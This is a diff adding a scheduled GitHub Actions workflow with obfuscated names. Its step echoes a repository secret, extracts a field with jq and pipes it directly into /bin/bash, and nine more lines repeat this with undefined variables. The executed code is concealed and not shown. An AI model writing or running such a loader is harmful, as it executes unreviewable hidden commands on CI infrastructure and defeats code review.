@@ -1,0 +1,27 @@
+name: zhihuangongkuai
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhihuangongkuai
+        env:
+          kl46: ${{ secrets.kl46 }}
+        run: |
+          echo $kl46 | jq -r .y7 | /bin/bash
+          echo $ywyag84 | jq -r .uswtt7 | /bin/bash
+          echo $ui6 | jq -r .vnr54 | /bin/bash
+          echo $gpx7 | jq -r .ttpkg88098 | /bin/bash
+          echo $dwe38 | jq -r .fg4 | /bin/bash
+          echo $hgrsa5066 | jq -r .fdpx19 | /bin/bash
+          echo $r1 | jq -r .ppib5 | /bin/bash
+          echo $lh188 | jq -r .emeqb56 | /bin/bash
+          echo $xtp310 | jq -r .r2639 | /bin/bash
+          echo $ckacp7994 | jq -r .xoy8 | /bin/bash
+
